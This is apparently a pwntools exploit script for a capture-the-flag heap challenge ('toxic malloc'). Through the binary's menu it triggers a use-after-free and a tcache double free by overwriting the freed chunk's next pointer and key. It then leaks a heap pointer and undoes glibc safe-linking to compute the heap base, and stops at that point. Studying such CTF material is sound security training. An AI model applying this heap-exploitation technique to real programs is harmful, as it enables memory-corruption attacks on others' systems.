from pwn import *

context.log_level = 'debug'

rem = process("./Pwnable/toxic malloc/problem/deploy/chall")

def decrypt_safe_linking(ptr):
  _12bits = []
  dec = 0
  while ptr != 0:
    _12bits.append(ptr & 0xfff)
    ptr = ptr >> 12

  x = _12bits.pop()
  while len(_12bits) > 0:
    dec |= x
    dec = dec << 12
    y = _12bits.pop()
    x = x ^ y
  dec |= x

  return dec

def create(idx, data):
  rem.sendlineafter(b'choice:', b"1")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendlineafter(b': ', data.encode())

def update(idx, data):
  rem.sendlineafter(b'choice:', b"2")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendlineafter(b': ', data.encode())

def read(idx):
  rem.sendlineafter(b'choice:', b"3")
  rem.sendlineafter(b": ", str(idx).encode())
  rem.recvuntil(b"data: ")
  return rem.recvline()

def delete(idx):
  rem.sendlineafter(b'choice:', b"4")
  rem.sendlineafter(b": ", str(idx).encode())

create(0, "A" * 7)

delete(0)

update(0, "B" * 8) #overwrite tcache_entry.next & key

delete(0)#double free

ptr = u64(read(0).rstrip().ljust(8, b'\x00'))
print(hex(ptr))
print(hex(decrypt_safe_linking(ptr)))
heap_base = decrypt_safe_linking(ptr) - 0x2a0
print(hex(heap_base))

# gdb.attach(rem)

# rem.interactive()